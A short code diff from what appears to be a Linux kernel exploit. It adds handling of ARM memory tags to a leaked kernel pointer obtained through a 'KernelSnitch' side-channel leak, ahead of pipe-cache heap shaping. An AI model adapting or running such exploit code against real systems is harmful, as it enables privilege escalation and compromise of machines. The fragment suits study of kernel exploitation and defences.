@@ -224,6 +224,12 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   if (leaked == (uintptr_t)-1) {
     pr_error("pipe KernelSnitch sk_buff page leak failed\n");
   }
+#if defined(KERNELSNITCH_MTE) && KERNELSNITCH_MTE
+  /* The found mm_struct carries the MTE tag in the top byte (bits 56-63);
+   * restore the canonical direct-map address (top byte 0xff) before any
+   * range/slab arithmetic. */
+  leaked = (leaked & ~(0xffULL << 56)) | (0xffULL << 56);
+#endif
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
 
   shape_pipe_cache();
